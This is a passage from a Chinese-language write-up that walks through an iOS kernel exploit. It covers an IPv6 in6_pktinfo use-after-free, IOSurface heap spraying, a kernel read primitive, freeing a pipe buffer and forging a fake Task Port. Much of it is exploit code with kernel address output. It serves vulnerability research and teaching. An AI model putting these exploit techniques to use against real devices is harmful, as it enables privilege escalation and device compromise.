    }
最终构造的`XML`如下
    2
    ${sizeof(uint32_t) + 1}
    ${key}
    0
此时我们拥有了一个`XML`模板，开始往里面填充数据，填充的数据分为两部分，一部分是构造的`data`，另一部分是标识`key`，完成填充后调用函数`IOSurface_set_value()`，该函数是函数`IOConnectCallMethod()`的封装，用于向内核发送数据
    for (uint32_t array_id = 0; array_id  0 ? 1 : 0);
        // 计算每一个数组元素data所需要的节点数量
        size_t xml_units_per_data = xml_units_for_data_size(data_size);
        size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
        // Allocate the args struct.
        struct IOSurfaceValueArgs *args;
        size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
        args = malloc(args_size);
        // Build the IOSurfaceValueArgs.
        args->surface_id = IOSurface_id;
        // Create the serialized OSArray. We'll remember the locations we need to fill in with our
        // data as well as the slot we need to set our key.
        uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
        uint32_t *key;
        size_t xml_size = serialize_IOSurface_data_array(args->xml,
                current_array_length, data_size, xml_data, &key);
        // Keep track of when we need to do GC.
        size_t sprayed = 0;
        size_t next_gc_step = 0;
        for (uint32_t array_id = 0; array_id  0) {
            // printf("\n");
        }
        free(args);
        free(xml_data);
        total_arrays += array_count;
        return true;
    }
堆喷的细节就分析到这里，所以在利用中，我们构造好堆喷数据和长度之后，就可以调用函数`rk64_via_uaf()`进行堆喷操作
    uint64_t rk64_via_uaf(uint64_t addr) {
        void *buf = read_20_via_uaf(addr);
        if (buf) {
            uint64_t r = *(uint64_t*)buf;
            free(buf);
            return r;
        }
        return 0;
    }
我们在上一步已经获取了`Task Port`的内核态地址，根据结构体偏移，我们可以获取到`IPC_SPACE`的内核地址
    uint64_t ipc_space_kernel = rk64_via_uaf(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    if (!ipc_space_kernel) {
        printf("[-] kernel read primitive failed!\n");
        goto err;
    }
    printf("[i] ipc_space_kernel: 0x%llx\n", ipc_space_kernel);
获取一下数据
    [i] our task port: 0xfffffff001c3cc38
    [i] ipc_space_kernel: 0xfffffff000a22fc0
## 6\. 任意释放Pipe Buffer
Pipe管道是一个可以用于跨进程通信的机制，它会在内核缓冲区开辟内存空间进行数据的读写，`fds[1]`用于写入数据，`fds[0]`用于读取数据
比如现在读写下标在`0`的位置，我们写入`0x10000`字节，那么下标就会移动到`0x10000`，当我们读取`0x10000`字节的时候，下标就会往回移动到`0`
最后一句写`8`字节到缓冲区里是为了用于后面的堆喷操作可以用构造的数据填充这片缓冲区，可以直接读取`8`字节的数据
    int fds[2];
    ret = pipe(fds);
    uint8_t pipebuf[0x10000];
    memset(pipebuf, 0, 0x10000);
    write(fds[1], pipebuf, 0x10000); // do write() to allocate the buffer on the kernel
    read(fds[0], pipebuf, 0x10000); // do read() to reset buffer position
    write(fds[1], pipebuf, 8); // write 8 bytes so later we can read the first 8 bytes
当我们调用函数`setsockopt()`时，会调用到函数`ip6_setpktopt()`
    setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
当选项名为`IPV6_PKTINFO`时，我们会发现一个逻辑：如果`pktinfo->ipi6_ifindex`为`0`且`&pktinfo->ipi6_addr`开始的`12`个字节的数据也都是`0`，就会调用函数`ip6_clearpktopts()`释放掉当前的`ip6_pktopts->in6_pktinfo`，这个判断条件简化一下就是整个结构体数据都是`0`就会被释放
    define    IN6_IS_ADDR_UNSPECIFIED(a)    \
        ((*(const __uint32_t *)(const void *)(&(a)->s6_addr[0]) == 0) && \
        (*(const __uint32_t *)(const void *)(&(a)->s6_addr[4]) == 0) && \
        (*(const __uint32_t *)(const void *)(&(a)->s6_addr[8]) == 0) && \
        (*(const __uint32_t *)(const void *)(&(a)->s6_addr[12]) == 0))
    static int
    ip6_setpktopt(int optname, u_char *buf, int len, struct ip6_pktopts *opt,
        int sticky, int cmsg, int uproto)
    {
        int minmtupolicy, preftemp;
        int error;
        boolean_t capture_exthdrstat_out = FALSE;
        switch (optname) {
        case IPV6_2292PKTINFO:
        case IPV6_PKTINFO: {
            struct ifnet *ifp = NULL;
            struct in6_pktinfo *pktinfo;
            if (len != sizeof (struct in6_pktinfo))
                return (EINVAL);
            pktinfo = (struct in6_pktinfo *)(void *)buf;
            if (optname == IPV6_PKTINFO && opt->ip6po_pktinfo &&
                pktinfo->ipi6_ifindex == 0 &&
                IN6_IS_ADDR_UNSPECIFIED(&pktinfo->ipi6_addr)) {
                ip6_clearpktopts(opt, optname);
                break;
            }
            ...
        }
函数`ip6_clearpktopts()`调用`FREE()`来执行释放缓冲区操作，这里面涉及到了堆的分配释放问题，由于并不是本文分析的重点，不过多深入
    #define R_Free(p) FREE((caddr_t)p, M_RTABLE);
    #define FREE(addr, type) \
        _FREE((void *)addr, type)
    #define FREE(addr, type) \
        _FREE((void *)addr, type)
    #define free _FREE
    #define FREE(addr, type) _free((void *)addr, type, __FILE__, __LINE__)
    void
    ip6_clearpktopts(struct ip6_pktopts *pktopt, int optname)
    {
        if (optname == -1 || optname == IPV6_PKTINFO) {
            if (pktopt->ip6po_pktinfo)
                FREE(pktopt->ip6po_pktinfo, M_IP6OPT);
            pktopt->ip6po_pktinfo = NULL;
        }
        ...
    }
我们现在想要实现释放Pipe缓冲区只需要先获取它的地址，然后IOSurface堆喷使用这个Pipe缓冲区地址构造的数据，通过调用函数`setsockopt()`设置整个`in6_pktinfo`结构体数据为`0`就可以把这个Pipe缓冲区给释放掉
根据我们泄露出来的`Task Port`获取Pipe缓冲区地址，注意不同的系统版本偏移需要有所调整
    uint64_t task = rk64_check(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t proc = rk64_check(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    uint64_t p_fd = rk64_check(proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));
    uint64_t fd_ofiles = rk64_check(p_fd + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
    uint64_t fproc = rk64_check(fd_ofiles + fds[0] * 8);
    uint64_t f_fglob = rk64_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    uint64_t fg_data = rk64_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    uint64_t pipe_buffer = rk64_check(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
    printf("[*] pipe buffer: 0x%llx\n", pipe_buffer);
函数`free_via_uaf()`与函数`rk64_via_uaf()`前面部分一样，都是通过创建一堆存在漏洞的Socket，然后去堆喷，只不过这里还要多一步填充结构体`in6_pktinfo`数据，可以看到我们填充的是一个全为`0`的数据，那么就会触发它进行释放操作
    int free_via_uaf(uint64_t addr) {
        ...
        struct in6_pktinfo *buf = malloc(sizeof(struct in6_pktinfo));
        memset(buf, 0, sizeof(struct in6_pktinfo));
        int ret = set_pktinfo(sockets[found_at], buf);
        free(buf);
        return ret;
    }
前期的准备工作到这里就差不多了，我们接下来开始进入一个关键环节：伪造一个Port
## 7\. 伪造Task Port
**备注：因为SMAP是iPhone 7开始引入的安全机制，内核访问用户态的内存会被限制，而我的测试环境是iPhone
6，所以前面我淡化了SMAP的存在感，但接下来该面对还是要面对**
申请一个`target`用于伪造Port，函数`find_port_via_uaf()`通过OOL数据自动转换Port为内核态地址的机制获取Port的内核态地址`target_addr`，函数`free_via_uaf()`将`pipe_buffer`给释放掉，但管道句柄`fds[0]`和`fds[1]`依旧拥有对这个内核缓冲区的读写权限
    mach_port_t target = new_port();
    uint64_t target_addr = find_port_via_uaf(target, MACH_MSG_TYPE_COPY_SEND);
    ret = free_via_uaf(pipe_buffer);
这个循环的操作有点像函数`find_port_via_uaf()`，利用自动转换的`Task
Port`内核态地址占位刚才释放掉的`pipe_buffer`，因为我们之前写入了`8`字节，所以这里读取`8`字节就是`pipe_buffer`的前`8`个字节数据，判断一下使用两种方法获取到的Port内核态地址是否相同，如果相同就退出循环，如果不同说明堆喷不成功，复位下标继续循环
    mach_port_t p = MACH_PORT_NULL;
    for (int i = 0; i ref_count = 0xff;
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 0xd00d;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = 0;
    fakeport->ip_receiver = ipc_space_kernel;
    if (SMAP) {
        write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
        read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);
    }
申请空间时的`kport_t`为作者构造的一个`port`结构体
    typedef volatile struct {
        uint32_t ip_bits;
        uint32_t ip_references;
        struct {
            uint64_t data;
            uint64_t type;
        } ip_lock; // spinlock
        struct {
            struct {
                struct {
                    uint32_t flags;
                    uint32_t waitq_interlock;
                    uint64_t waitq_set_id;
                    uint64_t waitq_prepost_id;
                    struct {
                        uint64_t next;
                        uint64_t prev;
                    } waitq_queue;
                } waitq;
                uint64_t messages;
                uint32_t seqno;